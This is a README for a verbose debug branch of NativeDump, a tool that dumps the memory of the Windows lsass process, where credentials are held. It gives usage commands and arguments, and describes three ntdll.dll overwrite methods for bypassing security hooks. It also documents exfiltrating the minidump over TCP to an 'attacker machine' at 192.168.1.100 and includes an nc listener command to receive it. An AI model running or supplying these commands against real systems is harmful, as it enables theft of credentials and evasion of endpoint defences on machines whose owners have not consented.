# NativeDump - Debug Branch

Debug version of [NativeDump](https://github.com/ricardojoserf/NativeDump) with **massive verbose output**, printing every single step, address, NTSTATUS code, and value during execution. Useful for understanding the internals, troubleshooting, and development.

This branch uses the **standard PEB walking approach** (same as main) to find lsasrv.dll in the lsass process, with these additions:

- **3 ntdll.dll overwrite methods**: disk, knowndlls, debugproc
- **Remote exfiltration**: Send the minidump over TCP to a remote listener
- **Verbose output**: Every API call, handle, address, memory region, PE header field, and struct value is printed


## Usage

```
NativeDump.exe [-o OPTION] [-k PATH] [-f OUTPUT_FILE] [-i IP_ADDRESS] [-p PORT]
```

### Arguments

| Argument | Description |
|---|---|
| `-o`, `--option` | Ntdll overwrite method: `disk`, `knowndlls`, or `debugproc` |
| `-k`, `--path` | Custom path for disk (`C:\...\ntdll.dll`) or debugproc (`c:\...\calc.exe`) methods |
| `-f`, `--file` | Output file name (default: `proc_<PID>.dmp`) |
| `-i`, `--ip` | Remote IP address for TCP exfiltration |
| `-p`, `--port` | Remote port for TCP exfiltration |


### Examples

Basic execution (no overwrite, local dump):

```
NativeDump.exe
```

With ntdll overwrite from disk:

```
NativeDump.exe -o disk
```

With ntdll overwrite from KnownDlls:

```
NativeDump.exe -o knowndlls
```

With ntdll overwrite using a debug process:

```
NativeDump.exe -o debugproc
```

Custom output file:

```
NativeDump.exe -f lsass.dmp
```

Remote exfiltration (send dump to attacker machine):

```
NativeDump.exe -i 192.168.1.100 -p 1234
```

Combining overwrite + remote:

```
NativeDump.exe -o knowndlls -i 192.168.1.100 -p 1234
```

Receive the dump on the attacker machine:

```
nc -lvnp 1234 > lsass.dmp
```


## Verbose Output

The debug branch prints detailed information for every step:

- **SeDebugPrivilege**: Token handle, LUID, NTSTATUS codes
- **Process discovery**: PID, process handle, access rights
- **PEB walking**: PEB address, Ldr, InInitializationOrderModuleList, every module with base address and full path
- **Ntdll overwrite**: PE header parsing (DOS/NT signatures, e_lfanew, SizeOfCode, BaseOfCode), file/section handles, memory protection changes
- **Memory regions**: Every region's base address, size, protection, state, and whether it was dumped or skipped
- **lsasrv.dll tracking**: Entry/exit of the module's memory range and final size
- **Minidump construction**: Header fields, stream directory entries, stream sizes, byte array sizes
- **Output**: File write confirmation or TCP connection details and bytes sent


## Ntdll Overwrite Methods

| Method | Description |
|---|---|
| `disk` | Maps ntdll.dll from disk using CreateFileA + CreateFileMappingA + MapViewOfFile |
| `knowndlls` | Opens a clean copy from `\KnownDlls\ntdll.dll` using NtOpenSection + MapViewOfFile |
| `debugproc` | Creates a process in DEBUG_PROCESS mode and reads its clean ntdll .text section with ReadProcessMemory |


## Project Structure

```
NativeDump/
  Program.cs      - Main logic: args, SeDebugPrivilege, PEB walking, memory loop
  Win32.cs         - P/Invoke declarations and struct definitions
  CreateFile.cs    - Minidump construction, file save, TCP send
  Overwrite.cs     - Ntdll overwrite methods (disk, knowndlls, debugproc)
```
